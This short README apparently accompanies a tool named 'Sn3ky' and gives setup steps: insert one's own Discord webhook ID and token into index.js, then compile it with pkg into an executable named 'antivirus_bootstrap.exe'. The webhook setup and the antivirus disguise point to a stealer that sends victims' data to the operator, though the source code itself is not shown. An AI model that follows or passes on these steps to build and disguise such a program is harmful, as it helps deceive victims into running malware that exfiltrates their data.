How to use Sn3ky?
1.Install pkg at https://npmjs.com/package/pkg then learn how to compile/convert/whatever a js file into exe file.
2.Open index.js and find WebhookID & WebhookToken then change it to your discord webhook ID & Token.
3.Compile the index.js to an exe file(How to compile/build index.js?)
4.Your done!

How to compile/build index.js?
For automatic OS Type compiling:
pkg index.js -o antivirus_bootstrap.exe
